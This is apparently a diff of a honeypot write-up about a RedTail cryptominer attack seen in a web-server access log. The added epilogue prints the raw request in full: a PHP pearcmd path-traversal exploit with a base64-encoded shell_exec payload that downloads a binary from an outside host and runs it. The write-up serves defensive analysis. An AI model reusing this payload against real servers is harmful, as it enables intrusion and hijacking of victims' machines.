@@ -6,7 +6,7 @@ While analyzing my daily access.log report, I noticed something really, really w
 > 26 December 2023, 04:21	202.1.200.239	GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode(\
 
 
-Above is the processed access.log report. I believe there's a raw base64 string present over there, but it got trimmed by my faulty regex script. So I decided to inspect the raw access.log file : 
+Above is the processed access.log report. I believe there's a raw base64 string present over there, but it got trimmed by my faulty regex script (probably). So I decided to inspect the raw access.log file : 
 
 > 202.1.200.239 - - [25/Dec/2023:21:21:16 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/+/tmp/ohhellohttpserver.php HTTP/1.1" 404 419 "-" "Custom-AsyncHttpClient"
 
@@ -104,3 +104,17 @@ All I have to do to get this one is by setting up a honeypot server with a publi
 ### Epilogue
 
 * VirusTotal analysis of this `redtail.x86_64` file : [miner.bldbd/xmrig](https://www.virustotal.com/gui/file/819f53b96bb5b8869531d3880b53cb5f354b2a2f5171e783bad495e1ac2cbbf0/detection)
+
+### Epilogue 2
+
+It's not my faulty regex script. In fact, I just fail to properly render it by using HTML. Here's the actual access.log line, shown by using simple grep.
+
+> grep "shell_exec" access.log
+
+```
+202.1.200.239 - - [25/Dec/2023:21:21:16 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode(\"bWtkaXIgLXAgL3RtcC8kKHdob2FtaSk7IGNkIC90bXAvJCh3aG9hbWkpOyB3Z2V0IGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBjdXJsIC1PIGh0dHA6Ly9kdy5vaHV5YWwueHl6L2Rvd25sb2FkL3JlZHRhaWwueDg2XzY0OyBtdiByZWR0YWlsLng4Nl82NCBwaHAuc2VsZnJlcDsgY2htb2QgK3ggcGhwLnNlbGZyZXA7IC4vcGhwLnNlbGZyZXA7IGVjaG8gUEhQLlNFTEZSRVA=\"));?>+/tmp/ohhellohttpserver.php HTTP/1.1" 404 419 "-" "Custom-AsyncHttpClient"
+```
+
+![image](https://github.com/altilunium/redtail/assets/70379302/f6b99e3e-3e12-48b6-bbda-38e68937a883)
+
+
